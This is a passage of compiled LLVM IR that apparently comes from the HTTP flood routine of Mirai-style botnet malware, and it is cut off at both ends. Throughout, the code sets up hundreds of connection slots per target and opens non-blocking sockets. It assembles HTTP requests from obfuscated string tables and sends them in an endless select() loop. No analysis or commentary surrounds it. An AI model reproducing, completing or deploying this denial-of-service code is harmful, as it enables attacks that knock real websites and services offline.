  %36 = getelementptr inbounds i8, i8* %15, i64 %35
  %37 = load i8, i8* %36, align 1
  %.off612 = add i8 %37, -97
  %38 = icmp ult i8 %.off612, 26
  br i1 %38, label %39, label %41

; <label>:39:                                     ; preds = %.lr.ph669
  %40 = add i8 %37, -32
  store i8 %40, i8* %36, align 1
  br label %41

; <label>:41:                                     ; preds = %.lr.ph669, %39
  %42 = load i32, i32* %5, align 4
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %5, align 4
  %44 = tail call i32 @util_strlen(i8* nonnull %15)
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %.lr.ph669, label %._crit_edge670.loopexit

._crit_edge670.loopexit:                          ; preds = %41
  br label %._crit_edge670

._crit_edge670:                                   ; preds = %._crit_edge670.loopexit, %.preheader623
  %46 = icmp slt i32 %18, 500
  %. = select i1 %46, i32 %18, i32 500
  tail call void @table_unlock_val(i8 zeroext 61)
  tail call void @table_unlock_val(i8 zeroext 62)
  tail call void @table_unlock_val(i8 zeroext 63)
  tail call void @table_unlock_val(i8 zeroext 64)
  tail call void @table_unlock_val(i8 zeroext 65)
  tail call void @table_unlock_val(i8 zeroext 66)
  tail call void @table_unlock_val(i8 zeroext 67)
  tail call void @table_unlock_val(i8 zeroext 68)
  tail call void @table_unlock_val(i8 zeroext 69)
  tail call void @table_unlock_val(i8 zeroext 70)
  tail call void @table_unlock_val(i8 zeroext 71)
  %47 = sext i32 %. to i64
  %48 = tail call noalias i8* @calloc(i64 %47, i64 3140) #10
  %49 = bitcast i8* %48 to %struct.attack_http_state*
  %50 = icmp sgt i32 %18, 0
  br i1 %50, label %.lr.ph667, label %.preheader621

.lr.ph667:                                        ; preds = %._crit_edge670
  %51 = zext i8 %0 to i32
  %52 = sext i32 %. to i64
  br label %70

.preheader621.loopexit:                           ; preds = %101
  br label %.preheader621

.preheader621:                                    ; preds = %.preheader621.loopexit, %._crit_edge670
  %53 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 0
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 0
  %55 = icmp sgt i32 %18, 0
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i64 0, i32 1
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i64 0, i32 0
  %58 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  %59 = bitcast i32* %12 to i8*
  %60 = bitcast %struct.sockaddr_in* %10 to i8*
  %61 = bitcast i32* %5 to i8*
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 0
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 2, i32 0
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 1
  %65 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %66 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 0
  %67 = icmp ne i8* %14, null
  %68 = sext i32 %. to i64
  %69 = sext i32 %. to i64
  %.not = icmp slt i32 %18, 1
  br label %.backedge622

; <label>:70:                                     ; preds = %.lr.ph667, %101
  %indvars.iv698 = phi i64 [ 0, %.lr.ph667 ], [ %indvars.iv.next699, %101 ]
  %71 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv698, i32 1
  store i8 0, i8* %71, align 4
  %72 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv698, i32 0
  store i32 -1, i32* %72, align 4
  %73 = trunc i64 %indvars.iv698 to i32
  %74 = srem i32 %73, %51
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %75, i32 1
  %77 = load i32, i32* %76, align 4
  %78 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv698, i32 4
  store i32 %77, i32* %78, align 4
  %79 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv698, i32 6, i64 0
  %80 = tail call i32 @util_strcpy(i8* %79, i8* %17)
  %81 = load i8, i8* %79, align 4
  %82 = icmp eq i8 %81, 47
  br i1 %82, label %87, label %83

; <label>:83:                                     ; preds = %70
  %84 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv698, i32 6, i64 1
  %85 = tail call i32 @util_strlen(i8* %79)
  %86 = sext i32 %85 to i64
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %84, i8* %79, i64 %86, i32 1, i1 false)
  store i8 47, i8* %79, align 4
  br label %87

; <label>:87:                                     ; preds = %70, %83
  %88 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv698, i32 10, i64 0
  %89 = tail call i32 @util_strcpy(i8* %88, i8* %15)
  %90 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv698, i32 9, i64 0
  %91 = tail call i32 @util_strcpy(i8* %90, i8* %15)
  %92 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv698, i32 7, i64 0
  %93 = tail call i32 @util_strcpy(i8* %92, i8* %16)
  %94 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %75, i32 2
  %95 = load i8, i8* %94, align 4
  %96 = icmp ult i8 %95, 32
  br i1 %96, label %97, label %101

; <label>:97:                                     ; preds = %87
  %98 = load i32, i32* %76, align 4
  %99 = tail call i32 @ntohl(i32 %98) #11
  %100 = tail call i32 @htonl(i32 %99) #11
  store i32 %100, i32* %78, align 4
  br label %101

; <label>:101:                                    ; preds = %97, %87
  tail call void @table_unlock_val(i8 zeroext 72)
  %102 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv698, i32 5, i64 0
  %103 = tail call i8* @table_retrieve_val(i32 72, i32* null)
  %104 = tail call i32 @util_strcpy(i8* %102, i8* %103)
  tail call void @table_lock_val(i8 zeroext 72)
  %105 = tail call i32 @util_strcpy(i8* %79, i8* %17)
  %indvars.iv.next699 = add nuw nsw i64 %indvars.iv698, 1
  %106 = icmp slt i64 %indvars.iv.next699, %52
  br i1 %106, label %70, label %.preheader621.loopexit

.backedge622.loopexit:                            ; preds = %.loopexit617
  br label %.backedge622.backedge

.backedge622:                                     ; preds = %.backedge622.backedge, %.preheader621
  %107 = call i64 @time(i64* null) #10
  %108 = trunc i64 %107 to i32
  %109 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %53) #10, !srcloc !1
  %110 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %54) #10, !srcloc !2
  br i1 %55, label %.lr.ph644.preheader, label %.backedge622.backedge

.lr.ph644.preheader:                              ; preds = %.backedge622
  br label %.lr.ph644

.lr.ph644:                                        ; preds = %.lr.ph644.preheader, %384
  %indvars.iv = phi i64 [ %indvars.iv.next, %384 ], [ 0, %.lr.ph644.preheader ]
  %.0550641 = phi i32 [ %.1551, %384 ], [ 0, %.lr.ph644.preheader ]
  %111 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv
  %112 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 1
  %113 = load i8, i8* %112, align 4
  %114 = icmp eq i8 %113, 1
  br i1 %114, label %115, label %119

; <label>:115:                                    ; preds = %.lr.ph644
  %116 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 12
  %117 = load i32, i32* %116, align 4
  %118 = icmp ne i32 %117, 0
  %.sink = select i1 %118, i8 4, i8 0
  store i8 %.sink, i8* %112, align 4
  br label %119

; <label>:119:                                    ; preds = %115, %.lr.ph644
  %120 = phi i8 [ %.sink, %115 ], [ %113, %.lr.ph644 ]
  switch i8 %120, label %380 [
    i8 0, label %121
    i8 2, label %154
    i8 4, label %177
    i8 6, label %338
    i8 7, label %352
    i8 10, label %366
  ]

; <label>:121:                                    ; preds = %119
  call void @llvm.memset.p0i8.i64(i8* nonnull %60, i8 0, i64 16, i32 4, i1 false)
  %122 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %111, i64 0, i32 0
  %123 = load i32, i32* %122, align 4
  %124 = icmp eq i32 %123, -1
  br i1 %124, label %127, label %125

; <label>:125:                                    ; preds = %121
  %126 = call i32 @close(i32 %123) #10
  br label %127

; <label>:127:                                    ; preds = %121, %125
  %128 = call i32 @socket(i32 2, i32 1, i32 0) #10
  store i32 %128, i32* %122, align 4
  %129 = icmp eq i32 %128, -1
  br i1 %129, label %384, label %130

; <label>:130:                                    ; preds = %127
  %131 = call i32 (i32, i32, ...) @fcntl(i32 %128, i32 3, i32 0) #10
  %132 = or i32 %131, 2048
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %128, i32 4, i32 %132) #10
  store i32 65535, i32* %5, align 4
  %134 = load i32, i32* %122, align 4
  %135 = call i32 @setsockopt(i32 %134, i32 0, i32 8, i8* nonnull %61, i32 4) #10
  store i16 2, i16* %62, align 4
  %136 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 4
  %137 = load i32, i32* %136, align 4
  store i32 %137, i32* %63, align 4
  %138 = call zeroext i16 @htons(i16 zeroext %20) #11
  store i16 %138, i16* %64, align 2
  %139 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 2
  store i32 %108, i32* %139, align 4
  store i8 2, i8* %112, align 4
  %140 = load i32, i32* %122, align 4
  %141 = call i32 @connect(i32 %140, %struct.sockaddr* nonnull %65, i32 16) #10
  %142 = load i32, i32* %122, align 4
  %143 = srem i32 %142, 64
  %144 = zext i32 %143 to i64
  %145 = shl i64 1, %144
  %146 = sdiv i32 %142, 64
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %147
  %149 = load i64, i64* %148, align 8
  %150 = or i64 %145, %149
  store i64 %150, i64* %148, align 8
  %151 = load i32, i32* %122, align 4
  %152 = icmp sgt i32 %151, %.0550641
  %153 = add nsw i32 %151, 1
  %..0550 = select i1 %152, i32 %153, i32 %.0550641
  br label %384

; <label>:154:                                    ; preds = %119
  %155 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 2
  %156 = load i32, i32* %155, align 4
  %157 = sub i32 %108, %156
  %158 = icmp ugt i32 %157, 30
  br i1 %158, label %159, label %163

; <label>:159:                                    ; preds = %154
  store i8 0, i8* %112, align 4
  %160 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %111, i64 0, i32 0
  %161 = load i32, i32* %160, align 4
  %162 = call i32 @close(i32 %161) #10
  store i32 -1, i32* %160, align 4
  br label %384

; <label>:163:                                    ; preds = %154
  %164 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %111, i64 0, i32 0
  %165 = load i32, i32* %164, align 4
  %166 = srem i32 %165, 64
  %167 = zext i32 %166 to i64
  %168 = shl i64 1, %167
  %169 = sdiv i32 %165, 64
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %170
  %172 = load i64, i64* %171, align 8
  %173 = or i64 %168, %172
  store i64 %173, i64* %171, align 8
  %174 = load i32, i32* %164, align 4
  %175 = icmp sgt i32 %174, %.0550641
  %176 = add nsw i32 %174, 1
  %..0550570 = select i1 %175, i32 %176, i32 %.0550641
  br label %384

; <label>:177:                                    ; preds = %119
  %178 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 14
  store i32 -1, i32* %178, align 4
  %179 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 11
  store i32 0, i32* %179, align 4
  %180 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 18, i64 0
  call void @util_zero(i8* %180, i32 1024)
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 17
  store i32 0, i32* %181, align 4
  call void @util_zero(i8* nonnull %66, i32 10240)
  %182 = call i32 @util_strlen(i8* nonnull %66)
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %183
  %185 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 9, i64 0
  %186 = call i32 @util_strcpy(i8* %184, i8* %185)
  %187 = call i32 @util_strlen(i8* nonnull %66)
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %188
  %190 = call i32 @util_strcpy(i8* %189, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %191 = call i32 @util_strlen(i8* nonnull %66)
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %192
  %194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 6, i64 0
  %195 = call i32 @util_strcpy(i8* %193, i8* %194)
  %196 = call i32 @util_strlen(i8* nonnull %66)
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %197
  %199 = call i32 @util_strcpy(i8* %198, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %200 = call i32 @util_strlen(i8* nonnull %66)
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %201
  %203 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 5, i64 0
  %204 = call i32 @util_strcpy(i8* %202, i8* %203)
  %205 = call i32 @util_strlen(i8* nonnull %66)
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %206
  %208 = call i32 @util_strcpy(i8* %207, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %209 = call i32 @util_strlen(i8* nonnull %66)
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %210
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 7, i64 0
  %213 = call i32 @util_strcpy(i8* %211, i8* %212)
  %214 = call i32 @util_strlen(i8* nonnull %66)
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %215
  %217 = call i32 @util_strcpy(i8* %216, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 57)
  %218 = call i32 @util_strlen(i8* nonnull %66)
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %219
  %221 = call i8* @table_retrieve_val(i32 57, i32* null)
  %222 = call i32 @util_strcpy(i8* %220, i8* %221)
  call void @table_lock_val(i8 zeroext 57)
  %223 = call i32 @util_strlen(i8* nonnull %66)
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %224
  %226 = call i32 @util_strcpy(i8* %225, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 58)
  %227 = call i32 @util_strlen(i8* nonnull %66)
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %228
  %230 = call i8* @table_retrieve_val(i32 58, i32* null)
  %231 = call i32 @util_strcpy(i8* %229, i8* %230)
  call void @table_lock_val(i8 zeroext 58)
  %232 = call i32 @util_strlen(i8* nonnull %66)
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %233
  %235 = call i32 @util_strcpy(i8* %234, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 59)
  %236 = call i32 @util_strlen(i8* nonnull %66)
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %237
  %239 = call i8* @table_retrieve_val(i32 59, i32* null)
  %240 = call i32 @util_strcpy(i8* %238, i8* %239)
  call void @table_lock_val(i8 zeroext 59)
  %241 = call i32 @util_strlen(i8* nonnull %66)
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %242
  %244 = call i32 @util_strcpy(i8* %243, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br i1 %67, label %245, label %273

; <label>:245:                                    ; preds = %177
  call void @table_unlock_val(i8 zeroext 60)
  %246 = call i32 @util_strlen(i8* nonnull %66)
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %247
  %249 = call i8* @table_retrieve_val(i32 60, i32* null)
  %250 = call i32 @util_strcpy(i8* %248, i8* %249)
  call void @table_lock_val(i8 zeroext 60)
  %251 = call i32 @util_strlen(i8* nonnull %66)
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %252
  %254 = call i32 @util_strcpy(i8* %253, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %255 = call i32 @util_strlen(i8* nonnull %66)
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %256
  %258 = call i8* @table_retrieve_val(i32 65, i32* null)
  %259 = call i32 @util_strcpy(i8* %257, i8* %258)
  %260 = call i32 @util_strlen(i8* nonnull %66)
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %261
  %263 = call i32 @util_strcpy(i8* %262, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %264 = call i32 @util_strlen(i8* nonnull %14)
  %265 = call i32 @util_strlen(i8* nonnull %66)
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %266
  %268 = call i8* @util_itoa(i32 %264, i32 10, i8* %267)
  %269 = call i32 @util_strlen(i8* nonnull %66)
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %270
  %272 = call i32 @util_strcpy(i8* %271, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br label %273

; <label>:273:                                    ; preds = %245, %177
  %274 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 15
  %275 = load i32, i32* %274, align 4
  %276 = icmp sgt i32 %275, 0
  br i1 %276, label %277, label %303

; <label>:277:                                    ; preds = %273
  %278 = call i32 @util_strlen(i8* nonnull %66)
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %279
  %281 = call i32 @util_strcpy(i8* %280, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  %282 = load i32, i32* %274, align 4
  %283 = icmp sgt i32 %282, 0
  %284 = call i32 @util_strlen(i8* nonnull %66)
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %285
  br i1 %283, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %277
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %287 = phi i8* [ %301, %.lr.ph ], [ %286, %.lr.ph.preheader ]
  %storemerge568640 = phi i32 [ %296, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %288 = sext i32 %storemerge568640 to i64
  %289 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 16, i64 %288, i64 0
  %290 = call i32 @util_strcpy(i8* %287, i8* %289)
  %291 = call i32 @util_strlen(i8* nonnull %66)
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %292
  %294 = call i32 @util_strcpy(i8* %293, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  %295 = load i32, i32* %5, align 4
  %296 = add nsw i32 %295, 1
  store i32 %296, i32* %5, align 4
  %297 = load i32, i32* %274, align 4
  %298 = icmp slt i32 %296, %297
  %299 = call i32 @util_strlen(i8* nonnull %66)
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %300
  br i1 %298, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %277
  %.lcssa = phi i8* [ %286, %277 ], [ %301, %._crit_edge.loopexit ]
  %302 = call i32 @util_strcpy(i8* %.lcssa, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br label %303

; <label>:303:                                    ; preds = %._crit_edge, %273
  %304 = call i32 @util_strlen(i8* nonnull %66)
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %305
  %307 = call i32 @util_strcpy(i8* %306, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  br i1 %67, label %308, label %313

; <label>:308:                                    ; preds = %303
  %309 = call i32 @util_strlen(i8* nonnull %66)
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %310
  %312 = call i32 @util_strcpy(i8* %311, i8* nonnull %14)
  br label %313

; <label>:313:                                    ; preds = %308, %303
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 10, i64 0
  %315 = call signext i8 @util_strcmp(i8* nonnull %185, i8* %314)
  %316 = icmp eq i8 %315, 0
  br i1 %316, label %317, label %319

; <label>:317:                                    ; preds = %313
  %318 = call i32 @util_strcpy(i8* nonnull %185, i8* %314)
  br label %319

; <label>:319:                                    ; preds = %313, %317
  %320 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %111, i64 0, i32 0
  %321 = load i32, i32* %320, align 4
  %322 = call i32 @util_strlen(i8* nonnull %66)
  %323 = sext i32 %322 to i64
  %324 = call i64 @send(i32 %321, i8* nonnull %66, i64 %323, i32 16384) #10
  %325 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv, i32 3
  store i32 %108, i32* %325, align 4
  store i8 6, i8* %112, align 4
  %326 = load i32, i32* %320, align 4
  %327 = srem i32 %326, 64
  %328 = zext i32 %327 to i64
  %329 = shl i64 1, %328
  %330 = sdiv i32 %326, 64
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %331
  %333 = load i64, i64* %332, align 8
  %334 = or i64 %329, %333
  store i64 %334, i64* %332, align 8
  %335 = load i32, i32* %320, align 4
  %336 = icmp sgt i32 %335, %.0550641
  %337 = add nsw i32 %335, 1
  %..0550571 = select i1 %336, i32 %337, i32 %.0550641
  br label %384

; <label>:338:                                    ; preds = %119
  %339 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %111, i64 0, i32 0
  %340 = load i32, i32* %339, align 4
  %341 = srem i32 %340, 64
  %342 = zext i32 %341 to i64
  %343 = shl i64 1, %342
  %344 = sdiv i32 %340, 64
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %345
  %347 = load i64, i64* %346, align 8
  %348 = or i64 %343, %347
  store i64 %348, i64* %346, align 8
  %349 = load i32, i32* %339, align 4
  %350 = icmp sgt i32 %349, %.0550641
  %351 = add nsw i32 %349, 1
  %..0550572 = select i1 %350, i32 %351, i32 %.0550641
  br label %384

; <label>:352:                                    ; preds = %119
  %353 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %111, i64 0, i32 0
  %354 = load i32, i32* %353, align 4
  %355 = srem i32 %354, 64
  %356 = zext i32 %355 to i64
  %357 = shl i64 1, %356
  %358 = sdiv i32 %354, 64
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %359
  %361 = load i64, i64* %360, align 8
  %362 = or i64 %357, %361
  store i64 %362, i64* %360, align 8
  %363 = load i32, i32* %353, align 4
  %364 = icmp sgt i32 %363, %.0550641
  %365 = add nsw i32 %363, 1
  %..0550573 = select i1 %364, i32 %365, i32 %.0550641
  br label %384

; <label>:366:                                    ; preds = %119
  %367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %111, i64 0, i32 0
  %368 = load i32, i32* %367, align 4
  %369 = srem i32 %368, 64
  %370 = zext i32 %369 to i64
  %371 = shl i64 1, %370
  %372 = sdiv i32 %368, 64
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %373
  %375 = load i64, i64* %374, align 8
  %376 = or i64 %371, %375
  store i64 %376, i64* %374, align 8
  %377 = load i32, i32* %367, align 4
  %378 = icmp sgt i32 %377, %.0550641
  %379 = add nsw i32 %377, 1
  %..0550574 = select i1 %378, i32 %379, i32 %.0550641
  br label %384

; <label>:380:                                    ; preds = %119
  store i8 0, i8* %112, align 4
  %381 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %111, i64 0, i32 0
  %382 = load i32, i32* %381, align 4
  %383 = call i32 @close(i32 %382) #10
  store i32 -1, i32* %381, align 4
  br label %384

; <label>:384:                                    ; preds = %366, %352, %338, %319, %163, %130, %380, %127, %159
  %.1551 = phi i32 [ %.0550641, %127 ], [ %.0550641, %159 ], [ %.0550641, %380 ], [ %..0550, %130 ], [ %..0550570, %163 ], [ %..0550571, %319 ], [ %..0550572, %338 ], [ %..0550573, %352 ], [ %..0550574, %366 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %385 = icmp slt i64 %indvars.iv.next, %68
  br i1 %385, label %.lr.ph644, label %._crit_edge645

._crit_edge645:                                   ; preds = %384
  %386 = icmp eq i32 %.1551, 0
  br i1 %386, label %.backedge622.backedge, label %387

.backedge622.backedge:                            ; preds = %._crit_edge645, %387, %.backedge622, %.backedge622.loopexit
  br label %.backedge622

; <label>:387:                                    ; preds = %._crit_edge645
  store i64 0, i64* %56, align 8
  store i64 1, i64* %57, align 8
  %388 = call i32 @select(i32 %.1551, %struct.fd_set* nonnull %7, %struct.fd_set* nonnull %8, %struct.fd_set* null, %struct.timeval* nonnull %9) #10
  %389 = call i64 @time(i64* null) #10
  %390 = trunc i64 %389 to i32
  %391 = icmp slt i32 %388, 1
  %brmerge = or i1 %391, %.not
  br i1 %brmerge, label %.backedge622.backedge, label %.lr.ph664.preheader

.lr.ph664.preheader:                              ; preds = %387
  br label %.lr.ph664

.lr.ph664:                                        ; preds = %.lr.ph664.preheader, %.loopexit617
  %indvars.iv696 = phi i64 [ %indvars.iv.next697, %.loopexit617 ], [ 0, %.lr.ph664.preheader ]
  %392 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 0
  %393 = load i32, i32* %392, align 4
  %394 = icmp eq i32 %393, -1
  br i1 %394, label %.loopexit617, label %395

; <label>:395:                                    ; preds = %.lr.ph664
  %396 = sdiv i32 %393, 64
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %397
  %399 = load i64, i64* %398, align 8
  %400 = srem i32 %393, 64
  %401 = zext i32 %400 to i64
  %402 = shl i64 1, %401
  %403 = and i64 %399, %402
  %404 = icmp eq i64 %403, 0
  br i1 %404, label %417, label %405

; <label>:405:                                    ; preds = %395
  store i32 0, i32* %12, align 4
  store i32 4, i32* %13, align 4
  %406 = load i32, i32* %392, align 4
  %407 = call i32 @getsockopt(i32 %406, i32 1, i32 4, i8* nonnull %59, i32* nonnull %13) #10
  %408 = load i32, i32* %12, align 4
  %409 = or i32 %408, %407
  %410 = icmp eq i32 %409, 0
  br i1 %410, label %411, label %413

; <label>:411:                                    ; preds = %405
  %412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 1
  store i8 4, i8* %412, align 4
  br label %417

; <label>:413:                                    ; preds = %405
  %414 = load i32, i32* %392, align 4
  %415 = call i32 @close(i32 %414) #10
  store i32 -1, i32* %392, align 4
  %416 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 1
  store i8 0, i8* %416, align 4
  br label %.loopexit617

